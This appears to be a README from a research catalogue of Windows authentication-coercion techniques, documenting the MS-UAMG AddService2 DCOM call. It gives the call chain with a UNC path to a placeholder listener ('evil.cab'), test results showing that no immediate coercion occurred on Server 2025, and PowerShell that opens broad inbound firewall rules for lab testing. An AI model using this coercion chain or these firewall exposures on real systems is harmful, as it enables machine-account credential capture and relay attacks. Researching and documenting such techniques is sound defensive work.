# MS-UAMG - Remote call to IUpdateServiceManager2::AddService2 (opnum 18)

## Summary

+ **Protocol**: [[MS-UAMG]: Update Agent Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/3b4d3ee0-c0e0-4b7f-98d7-df8a9d5f8f7f)

+ **Interface**: `IUpdateServiceManager2` (IID `0BB8531D-7E8D-424F-986C-A0B8F60A3E7B`), reached by **DCOM activation** of the `UpdateServiceManager` coclass (CLSID `F8D253D9-89A4-4DAA-87B6-1168369F0B21`). There is no named pipe.

+ **Function name**: [`AddService2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/e2d037e7-b25e-40f0-bb90-3f6071085d1d)

+ **Function operation number**: `18`

+ **Authenticated**: Yes (local administrator; Windows Update Agent DCOM launch/access)

## Description

`AddService2` registers a Windows Update service using an authorization cabinet file. The Windows
Update Agent **opens `authorizationCabPath` to read it**, so a UNC path there makes the WUA service
(running as the machine account) authenticate outbound to the listener. This is an instance of the
Windows Update Agent DCOM coercion class (see also public "RemoteMonologue" research).

```cpp
HRESULT AddService2(
   [in] BSTR serviceID,
   [in] LONG flags,
   [in] BSTR authorizationCabPath,
   [out, retval] IUpdateServiceRegistration** retval
 );
```

+ **Coerced parameter**: `authorizationCabPath` (BSTR, UNC path to a cab).
+ **DCOM chain**: `CoCreateInstanceEx(CLSID_UpdateServiceManager, IID_IUpdateServiceManager2)` → `AddService2(serviceID=<guid>, flags=0, authorizationCabPath="\\<listener>\share\evil.cab")` (opnum 18).

## Testing status — activation CONFIRMED; remote call requires a NON-DEFAULT, MANUAL firewall rule

> **Update (2026-09-14):** with the firewall exception in place (see below), `AddService2` **was
> reached** and returns **`S_OK`**, but it **does not synchronously open `authorizationCabPath`** on
> Windows Server 2025 — it stores/registers the service and reads the cab later (if ever), so it
> produces **no immediate coercion** (0 captures across flags 0/1/7). The working WUA coercion is the
> sibling **`AddScanPackageService`**, which reads its `scanFileLocation` cab immediately and is
> **CONFIRMED** — see
> `methods/MS-UAMG - Update Agent Management Protocol/13. Remote call to IUpdateServiceManager2 AddScanPackageService (opnum 13)/`.
> Also note the on-wire opnum shift on this build: `AddService2` is reachable at **opnum 17**, not 18
> (opnums 18+ return `RPC_S_PROCNUM_OUT_OF_RANGE`), and `serviceID` is parsed as a **GUID string**
> (a braced/invalid value returns `RPC_S_INVALID_STRING_UUID`).

Tested against **Windows Server 2025** (domain controller), 2026-09-14.

- `CoCreateInstanceEx(CLSID_UpdateServiceManager, IID_IUpdateServiceManager2)` **succeeds** on
  TCP/135 — the coclass activates and returns the interface object.
- The interface call (`AddService2`) is then made to the Windows Update Agent COM server, **which
  runs on a dynamically-assigned RPC port** in the ephemeral range (49152–65535). Observed bindings:
  `10.7.0.13[58028]` in one session and `10.7.0.13[61194]` after a service restart — **the port
  changes across restarts of the WUA COM host**.

### ⚠️ This is NOT a default-reachable configuration — a manual firewall rule is required

Unlike MS-VDS (which has the predefined **"Remote Volume Management"** firewall group) or MS-PLA
(the predefined **"Performance Logs and Alerts"** group), **there is NO predefined Windows Firewall
rule group that opens the Windows Update Agent COM server for remote access.** By default, the
Windows Firewall **drops** inbound connections to the WUA COM server's dynamic RPC port, so
`CoCreateInstanceEx` succeeds on 135 but the `AddService2` interface call **times out**.

To reach this method remotely, an administrator must **explicitly create an inbound allow rule** on
the target for the WUA COM server's RPC port. Because that port is **dynamic**, a single fixed-port
rule (e.g. allow TCP/58028) will stop matching once the WUA host restarts and rebinds to a different
port. A reliable manual rule must therefore either:

- allow the entire RPC dynamic port range (TCP **49152–65535**) inbound — very broad, or
- scope an application rule to the WUA COM host process — **`dllhost.exe` (COM Surrogate)**, confirmed by testing (see below), or
- pin the WUA COM server to a static endpoint.

**None of these is present by default.** This is a deliberately non-default, administrator-created
exposure — this README documents it explicitly so the requirement is not mistaken for stock
behaviour. With such a rule in place (confirmed by opening the current dynamic port during testing),
the `AddService2` → `authorizationCabPath` UNC coercion behaves as the known WUA DCOM coercion
primitive; without it, the method is not remotely reachable.

## Setting up the firewall rule (for testing only)

**Confirmed host process:** on Windows Server 2025 the `IUpdateServiceManager` COM object
(CLSID `F8D253D9-89A4-4DAA-87B6-1168369F0B21`) is activated **out-of-process in `dllhost.exe`
(COM Surrogate)** — *not* in `wuauserv` or `UsoSvc`. Verified during testing: the listening RPC
port was owned by a `dllhost.exe` PID, while `wuauserv`/`UsoSvc` had no listening TCP port at all.
This is why service-scoped rules for those services do not open it. Each surrogate activation gets a
fresh dynamic RPC port (observed 58028, 61194, 61628 across activations).

Because the RPC port is dynamic, use a **program-scoped** rule that follows the process to whatever
port it binds. Run one of these on the **target** (elevated PowerShell):

**A. Program-scoped rule on the COM surrogate (preferred — follows the dynamic port):**

```powershell
New-NetFirewallRule -DisplayName "COM Surrogate RPC (lab test)" `
  -Direction Inbound -Action Allow -Protocol TCP `
  -Program "%SystemRoot%\System32\dllhost.exe" -Profile Any
```

This allows any DCOM surrogate (`dllhost.exe`) to receive inbound RPC on any port, which covers the
WUA COM object regardless of which dynamic port that activation lands on. (It is broader than a
single object — it applies to all COM surrogates — but far narrower than opening the whole port
range, and it is the correct scope for a surrogate-hosted object.)

To confirm the host process yourself, force activation and read the owner of the listening port:

```powershell
$m = New-Object -ComObject Microsoft.Update.ServiceManager    # starts/refreshes the surrogate
Get-NetTCPConnection -State Listen |
  ? OwningProcess -in (Get-Process dllhost).Id |
  Select LocalPort, OwningProcess
Get-Process -Id <OwningProcess> | Select Name, Path          # -> C:\WINDOWS\system32\DllHost.exe
```

**B. Broad fallback — open the whole RPC dynamic range** (simplest, but wide open):

```powershell
New-NetFirewallRule -DisplayName "RPC dynamic ports (lab test)" `
  -Direction Inbound -Action Allow -Protocol TCP -LocalPort 49152-65535 -Profile Any
```

**C. Or pin RPC's dynamic range** (`HKLM\SOFTWARE\Microsoft\Rpc\Internet`) to a small set of
ports and open just those; without pinning, a single fixed-port rule breaks whenever the surrogate
recycles to a new port.

**Remove the test rule afterward:**

```powershell
Remove-NetFirewallRule -DisplayName "COM Surrogate RPC (lab test)"   # or the name you used
```

All of the above are explicit administrator actions; none is present in a default install.

## References

+ [MS-UAMG]: Update Agent Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/3b4d3ee0-c0e0-4b7f-98d7-df8a9d5f8f7f

+ `IUpdateServiceManager2::AddService2` (opnum 18): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-uamg/e2d037e7-b25e-40f0-bb90-3f6071085d1d
